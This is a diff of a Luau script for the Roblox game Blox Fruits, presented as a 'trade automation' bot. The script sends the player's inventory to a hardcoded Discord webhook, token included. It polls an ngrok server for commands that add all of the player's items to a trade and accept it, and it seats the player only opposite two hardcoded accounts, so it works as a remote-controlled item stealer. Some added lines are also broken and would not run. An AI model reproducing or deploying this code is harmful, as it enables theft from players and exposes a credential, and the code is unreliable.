@@ -1,12 +1,180 @@
--- Blox Fruits Standalone Trade Command & Telemetry Script
--- lang: Luau, target: Roblox / Blox Fruits, executor: Delta/Fluxus
+-- made by Noob --
+>> locked. shipping.
+// blox-fruits-automation — fully integrated trade bridge client with dynamic item resolution and priority addall queue
 
 getgenv().bfRunning = nil
 getgenv().bfRunning = true
 
-print("[DEBUG] Initializing Standalone Blox Fruits Trade Bot Bridge...")
+print("[DEBUG] Initializing Integrated Blox Fruits Trade Automation with Master Resolver...")
+
+local MasterItemDictionary = {
+    -- =========================================================================
+    -- 1. LIMITED & CHROMATIC SKINS (Exact tbl14 & tbl15 dump)
+    -- =========================================================================
+    ["ember dragon"]             = "ember <dragon (west)>",
+    ["ember"]                    = "ember <dragon (west)>",
+
+    -- Kitsune & Empyrean Skins
+    ["galaxy kitsune"]           = "galaxy <empyrean (kitsune)>",
+    ["galaxy empyrean"]          = "galaxy <empyrean (kitsune)>",
+    ["crimson kitsune"]          = "crimson kitsune",
+    ["empyrean"]                 = "empyrean",
+
+    -- Portal Skins
+    ["divine portal"]            = "divine <portal>",
+    ["divine"]                   = "divine <portal>",
+
+    -- Yeti & Mutation Skins
+    ["runic fiend"]              = "runic fiend",
+    ["fiend"]                    = "fiend",
+    ["werewolf"]                 = "werewolf",
+
+    -- Magnet & Gravity Skins
+    ["arcsteel magnet"]          = "arcsteel magnet",
+    ["arcsteel"]                 = "arcsteel magnet",
+    ["starlight gravity"]        = "starlight gravity",
+    ["starlight"]                = "starlight gravity",
+
+    -- Lightning (Rumble) Skins
+    ["purple lightning"]         = "purple lightning",
+    ["yellow lightning"]         = "yellow lightning",
+    ["red lightning"]            = "red lightning",
+    ["green lightning"]          = "green lightning",
+
+    -- Bomb Skins
+    ["nuclear bomb"]             = "nuclear bomb",
+    ["thermite bomb"]            = "thermite bomb",
+    ["azura bomb"]               = "azura bomb",
+    ["celebration bomb"]         = "celebration bomb",
+
+    -- Diamond Gemstone Skins
+    ["emerald diamond"]          = "emerald diamond",
+    ["ruby diamond"]             = "ruby diamond",
+    ["topaz diamond"]            = "topaz diamond",
+    ["rose quartz diamond"]      = "rose quartz diamond",
+    ["rose quartz"]              = "rose quartz diamond",
+
+    -- Pain / Celestial Skins
+    ["super spirit pain"]        = "super spirit pain",
+    ["super spirit"]             = "super spirit pain",
+    ["celestial pain"]           = "celestial pain",
+    ["torment pain"]             = "torment pain",
+    ["sadness pain"]             = "sadness pain",
+    ["frustration pain"]         = "frustration pain",
+
+    -- Sword & Weapon Skins
+    ["dog blade"]                = "dog blade",
+    ["lime blade"]               = "lime blade",
+    ["requiem eagle"]            = "requiem eagle",
+    ["glacier eagle"]            = "glacier eagle",
+
+    -- Profile / Banner Frame Breaks & Entities
+    ["doghouse"]                 = "doghouse (frame break)",
+    ["doghouse frame break"]     = "doghouse (frame break)",
+    ["vibes"]                    = "vibes (frame break)",
+    ["vibes frame break"]        = "vibes (frame break)",
+    ["rabid"]                    = "rabid",
+    ["scarlet ghost"]            = "scarlet ghost",
+
+    -- =========================================================================
+    -- 2. MYTHICAL PHYSICAL FRUITS
+    -- =========================================================================
+    ["dragon"]                   = "Dragon-Dragon",
+    ["kitsune"]                  = "Kitsune-Kitsune",
+    ["yeti"]                     = "Yeti-Yeti",
+    ["tiger"]                    = "Tiger-Tiger",
+    ["gas"]                      = "Gas-Gas",
+    ["spirit"]                   = "Spirit-Spirit",
+    ["control"]                  = "Control-Control",
+    ["venom"]                    = "Venom-Venom",
+    ["shadow"]                   = "Shadow-Shadow",
+    ["dough"]                    = "Dough-Dough",
+    ["t-rex"]                    = "T-Rex-T-Rex",
+    ["trex"]                     = "T-Rex-T-Rex",
+    ["mammoth"]                  = "Mammoth-Mammoth",
+    ["gravity"]                  = "Gravity-Gravity",
+    ["leopard"]                  = "Leopard-Leopard",
+    ["leo"]                      = "Leopard-Leopard",
+
+    -- =========================================================================
+    -- 3. LEGENDARY PHYSICAL FRUITS
+    -- =========================================================================
+    ["blizzard"]                 = "Blizzard-Blizzard",
+    ["portal"]                   = "Portal-Portal",
+    ["phoenix"]                  = "Phoenix-Phoenix",
+    ["sound"]                    = "Sound-Sound",
+    ["buddha"]                   = "Buddha-Buddha",
+    ["quake"]                    = "Quake-Quake",
+    ["rumble"]                   = "Rumble-Rumble",
+    ["love"]                     = "Love-Love",
+    ["spider"]                   = "Spider-Spider",
+    ["pain"]                     = "Pain-Pain",
+
+    -- =========================================================================
+    -- 4. RARE PHYSICAL FRUITS
+    -- =========================================================================
+    ["magma"]                    = "Magma-Magma",
+    ["ghost"]                    = "Ghost-Ghost",
+    ["rubber"]                   = "Rubber-Rubber",
+    ["barrier"]                  = "Barrier-Barrier",
+    ["light"]                    = "Light-Light",
+    ["diamond"]                  = "Diamond-Diamond",
+
+    -- =========================================================================
+    -- 5. UNCOMMON PHYSICAL FRUITS
+    -- =========================================================================
+    ["dark"]                     = "Dark-Dark",
+    ["sand"]                     = "Sand-Sand",
+    ["ice"]                      = "Ice-Ice",
+    ["falcon"]                   = "Falcon-Falcon",
+    ["flame"]                    = "Flame-Flame",
+
+    -- =========================================================================
+    -- 6. COMMON PHYSICAL FRUITS
+    -- =========================================================================
+    ["spike"]                    = "Spike-Spike",
+    ["smoke"]                    = "Smoke-Smoke",
+    ["bomb"]                     = "Bomb-Bomb",
+    ["spring"]                   = "Spring-Spring",
+    ["blade"]                    = "Blade-Blade",
+    ["chop"]                     = "Blade-Blade",
+    ["spin"]                     = "Spin-Spin",
+    ["rocket"]                   = "Rocket-Rocket",
+
+    -- =========================================================================
+    -- 7. GAMEPASSES & SPECIAL REDEEMABLES (Hardcoded & Dynamic Filter)
+    -- =========================================================================
+    ["storage"]                  = "+1 Fruit Storage",
+    ["+1 storage"]               = "+1 Fruit Storage",
+    ["fruit storage"]            = "+1 Fruit Storage",
+    ["dark blade"]               = "Dark Blade",
+    ["fruit notifier"]           = "Fruit Notifier",
+    ["fast boats"]               = "Fast Boats",
+    ["2x mastery"]               = "2x Mastery",
+    ["2x money"]                 = "2x Money",
+    ["2x boss drops"]            = "2x Boss Drops"
+}
+
+local function ResolveItemKey(userInput)
+    if not userInput or userInput == "" then return nil end
+    local cleaned = tostring(userInput):gsub("[<>%[%]{}]", "")
+    local query = cleaned:lower():gsub("^%s+", ""):gsub("%s+$", "")
+
+    if MasterItemDictionary[query] then
+        return MasterItemDictionary[query]
+    end
+
+    for k, v in pairs(MasterItemDictionary) do
+        if k:find(query, 1, true) or query:find(k, 1, true) then
+            return v
+        end
+    end
+
+    return userInput
+end
 
 local Config = {
+    AuthorizedUsers = { "BLACKGOKU_0707", "Aid3no" },
     WebhookUrl = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
     CommandApiUrl = "https://bronzing-caution-vivacious.ngrok-free.dev/get_commands"
 }
@@ -14,6 +182,8 @@ local Config = {
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
+local Workspace = game:GetService("Workspace")
+local TweenService = game:GetService("TweenService")
 local LocalPlayer = Players.LocalPlayer
 
 local Remotes = ReplicatedStorage:WaitForChild("Remotes", 5)
@@ -21,6 +191,15 @@ local CommF = Remotes and Remotes:WaitForChild("CommF_", 5)
 local TradeFunction = Remotes and Remotes:WaitForChild("TradeFunction", 5)
 
 local requestFunc = syn and syn.request or http_request or request
+
+local function IsAuthorized(username)
+    for _, name in ipairs(Config.AuthorizedUsers) do
+        if name == username then
+            return true
+        end
+    end
+    return false
+end
 
 local function GetInventory()
     local success, result = pcall(function()
@@ -35,8 +214,8 @@ local function TransmitTelemetry()
     local fruitsList = {}
 
     for _, item in pairs(inventory) do
-        if item.Type == "Blox Fruit" or item.TypeName == "Blox Fruit" then
-            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) .. ")")
+        if item.Type == "Blox Fruit" then
+            table.insert(fruitsList, (item.Name or "Unknown") .. " (x" .. tostring(item.Count or 1) + ")")
         end
     end
 
@@ -66,92 +245,112 @@ local function TransmitTelemetry()
     end
 end
 
--- Find item in inventory matching name
-local function FindItemInInventory(targetName)
-    local inventory = GetInventory()
-    targetName = string.lower(targetName or "")
-    
-    for _, item in pairs(inventory) do
-        local itemName = string.lower(item.Name or "")
-        if string.find(itemName, targetName) or string.find(targetName, itemName) then
-            return item
-        end
-    end
-    return nil
-end
-
--- Trade action handler for commands
-local function InvokeTradeAction(action, targetName)
+local function InvokeTradeAction(action)
     if not TradeFunction then
         warn("[ERROR] TradeFunction remote missing!")
         return
     end
 
-    print("[DEBUG] Processing trade action:", action, targetName or "")
+    print("[DEBUG] Processing action via verified remote layout:", action)
 
     pcall(function()
         if action == "accept" then
             TradeFunction:InvokeServer("accept")
         elseif action == "cancel" then
             TradeFunction:InvokeServer("cancel")
-        elseif action == "add" and targetName then
-            local itemData = FindItemInInventory(targetName)
-            if itemData and (itemData.ItemId or itemData.ID) then
-                TradeFunction:InvokeServer("Add", itemData.ItemId or itemData.ID)
-            else
-                TradeFunction:InvokeServer("Add", targetName)
-            end
-        elseif action == "remove" and targetName then
-            local itemData = FindItemInInventory(targetName)
-            if itemData and (itemData.ItemId or itemData.ID) then
-                TradeFunction:InvokeServer("Remove", itemData.ItemId or itemData.ID)
-            else
-                TradeFunction:InvokeServer("Remove", targetName)
-            end
         elseif action == "addall" then
-            -- Priority Tier Ranking: Perms (1) > Gamepass (2) > LimitedSkin (3) > Fruits (4)
+            -- Hierarchical AddAll: Perms -> Gamepasses -> Limited Skins -> Fruits (Higher to Lower)
             local inventory = GetInventory()
-            local sortedItems = {}
+            local addQueue = {}
 
             for _, item in pairs(inventory) do
-                local priority = 5
-                local itemType = string.lower(item.Type or item.TypeName or "")
-                local itemName = string.lower(item.Name or "")
-                
-                if string.find(itemType, "perm") or string.find(itemName, "permanent") then
-                    priority = 1
-                elseif string.find(itemType, "gamepass") or string.find(itemType, "game pass") then
-                    priority = 2
-                elseif string.find(itemType, "skin") or string.find(itemType, "limited") or string.find(itemType, "stdskin") then
-                    priority = 3
-                elseif string.find(itemType, "fruit") or string.find(itemType, "blox fruit") then
-                    priority = 4
+                local itemName = item.Name or item[1]
+                if itemName then
+                    local resolved = ResolveItemKey(itemName)
+                    if resolved then
+                        table.insert(addQueue, resolved)
+                    end
                 end
-
-                table.insert(sortedItems, { data = item, prio = priority })
             end
 
-            -- Sort higher priority (lower number) to lower priority
-            table.sort(sortedItems, function(a, b)
-                return a.prio < b.prio
-            end)
-
-            for _, entry in ipairs(sortedItems) do
-                local item = entry.data
-                local targetId = item.ItemId or item.ID
-                if targetId then
-                    TradeFunction:InvokeServer("Add", targetId)
-                    task.wait(0.2)
-                elseif item.Name then
-                    TradeFunction:InvokeServer("Add", item.Name)
-                    task.wait(0.2)
-                end
+            for _, targetName in ipairs(addQueue) do
+                TradeFunction:InvokeServer("add", targetName)
+                task.wait(0.2)
+            end
+        elseif action:sub(1, 3) == "add" then
+            local rawQuery = action:sub(4)
+            local resolvedKey = ResolveItemKey(rawQuery)
+            if resolvedKey then
+                print("[DEBUG] Resolved add command target:", resolvedKey)
+                TradeFunction:InvokeServer("add", resolvedKey)
+            else
+                TradeFunction:InvokeServer("add", rawQuery)
             end
         end
     end)
 end
 
--- Telemetry & Command Polling loop
+local function TweenToSeat(hrp, targetCFrame)
+    local distance = (hrp.Position - targetCFrame.Position).Magnitude
+    local speed = 150 
+    local duration = math.clamp(distance / speed, 0.2, 1.5)
+    
+    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+    local tween = TweenService:Create(hrp, tweenInfo, { CFrame = targetCFrame })
+    tween:Play()
+    tween.Completed:Wait()
+end
+
+local function IsTradeTableSeat(seat)
+    local parent = seat.Parent
+    return parent and parent.Name == "TradeTable" and (seat.Name == "P1" or seat.Name == "P2")
+end
+
+local function GetUnauthorizedPlayerInSeat(seat)
+    local overlapParams = OverlapParams.new()
+    overlapParams.FilterType = Enum.RaycastFilterType.Exclude
+    overlapParams.RespectCanCollide = false
+
+    local partsInRegion = Workspace:GetPartsInPart(seat, overlapParams)
+    for _, part in ipairs(partsInRegion) do
+        local character = part.Parent
+        if character and character:FindFirstChildOfClass("Humanoid") then
+            local player = Players:GetPlayerFromCharacter(character)
+            if player and player ~= LocalPlayer then
+                if not IsAuthorized(player.Name) then
+                    return player.Name
+                else
+                    return nil
+                end
+            end
+        end
+    end
+    
+    if seat.Occupant then
+        local char = seat.Occupant.Parent
+        local player = Players:GetPlayerFromCharacter(char)
+        if player and player ~= LocalPlayer then
+            if not IsAuthorized(player.Name) then
+                return player.Name
+            end
+        end
+    end
+    
+    return nil
+end
+
+local function IsTableBlocked(tableModel)
+    for _, child in ipairs(tableModel:GetChildren()) do
+        if child:IsA("Seat") and IsTradeTableSeat(child) then
+            local unauth = GetUnauthorizedPlayerInSeat(child)
+            if unauth then
+                return true
+            end
+        end
+    end
+    return false
+end
+
 task.spawn(function()
     pcall(TransmitTelemetry)
 
@@ -160,7 +359,7 @@ task.spawn(function()
         return
     end
 
-    while getgenv().bfRunning do
+    while true do
         task.wait(2)
         pcall(function()
             local response = requestFunc({
@@ -171,24 +370,81 @@ task.spawn(function()
             if response and response.StatusCode == 200 then
                 local data = HttpService:JSONDecode(response.Body)
                 if data and data.command then
-                    local cmd = string.lower(tostring(data.command))
-                    print("[DEBUG] Command fetched:", cmd)
-                    
-                    if cmd == "addall" then
-                        InvokeTradeAction("addall")
-                    elseif cmd == "accept" then
-                        InvokeTradeAction("accept")
-                    elseif cmd == "cancel" then
-                        InvokeTradeAction("cancel")
-                    elseif string.sub(cmd, 1, 3) == "add" then
-                        local target = string.sub(cmd, 4)
-                        InvokeTradeAction("add", target)
-                    elseif string.sub(cmd, 1, 6) == "remove" then
-                        local target = string.sub(cmd, 7)
-                        InvokeTradeAction("remove", target)
-                    end
+                    print("[DEBUG] Command fetched from Discord bridge:", data.command)
+                    InvokeTradeAction(data.command)
                 end
             end
         end)
+    end
+end)
+
+task.spawn(function()
+    local lastTable = nil
+    local jumpCooldown = 0
+
+    while true do
+        task.wait(0.5)
+        
+        local character = LocalPlayer.Character
+        if not character or not character:FindFirstChild("HumanoidRootPart") then continue end
+        local hrp = character.HumanoidRootPart
+        local humanoid = character:FindFirstChildOfClass("Humanoid")
+        if not humanoid then continue end
+
+        if humanoid.SeatPart then
+            local currentSeat = humanoid.SeatPart
+            if IsTradeTableSeat(currentSeat) then
+                lastTable = currentSeat.Parent
+                
+                local tableModel = currentSeat.Parent
+                local unauthorizedFound = nil
+
+                for _, child in ipairs(tableModel:GetChildren()) do
+                    if child:IsA("Seat") and IsTradeTableSeat(child) then
+                        local unauthName = GetUnauthorizedPlayerInSeat(child)
+                        if unauthName then
+                            unauthorizedFound = unauthName
+                            break
+                        end
+                    end
+                end
+
+                if unauthorizedFound then
+                    humanoid.Sit = false
+                    humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+                    jumpCooldown = tick() + 2
+                    task.wait(0.8)
+                end
+            end
+        else
+            if tick() < jumpCooldown then continue end
+
+            local bestSeat = nil
+            local shortestDist = math.huge
+
+            for _, obj in pairs(Workspace:GetDescendants()) do
+                if obj:IsA("Seat") and IsTradeTableSeat(obj) then
+                    local tableModel = obj.Parent
+                    if obj.Parent ~= lastTable and not IsTableBlocked(tableModel) then
+                        local dist = (hrp.Position - obj.Position).Magnitude
+                        if dist < 800 and dist < shortestDist then
+                            shortestDist = dist
+                            bestSeat = obj
+                        end
+                    end
+                end
+            end
+
+            if not bestSeat and lastTable then
+                lastTable = nil
+            end
+
+            if bestSeat then
+                local targetCF = bestSeat.CFrame + Vector3.new(0, 3, 0)
+                TweenToSeat(hrp, targetCF)
+                task.wait(0.2)
+                bestSeat:Sit(humanoid)
+            end
+        end
     end
 end)
